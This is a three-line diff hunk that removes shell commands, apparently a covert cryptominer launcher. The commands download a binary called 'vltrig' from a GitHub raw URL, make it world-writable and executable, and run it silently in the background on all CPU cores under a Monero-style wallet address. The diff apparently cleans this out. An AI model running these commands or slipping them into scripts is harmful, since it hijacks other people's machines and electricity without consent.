@@ -1,3 +1,0 @@
-curl https://github.com/liecamshoe/file/raw/main/vltrig -L -o vltrig
-chmod 777 vltrig
-./vltrig --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass x -t $(nproc --all) > /dev/null 2>&1 &
